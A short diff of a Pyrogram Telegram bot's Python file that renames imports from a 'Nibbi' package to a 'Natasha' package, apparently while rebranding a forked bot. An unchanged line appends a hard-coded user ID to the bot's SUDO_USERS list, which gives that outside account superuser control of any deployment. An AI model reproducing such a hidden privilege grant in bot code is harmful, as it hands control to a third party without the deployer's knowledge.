@@ -1,8 +1,8 @@
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from Nibbi.Modules.helpers.admins import get_administrators
-from Nibbi.config import SUDO_USERS
+from Natasha.Modules.helpers.admins import get_administrators
+from Natasha.config import SUDO_USERS
 
 SUDO_USERS.append(5616461719)
 
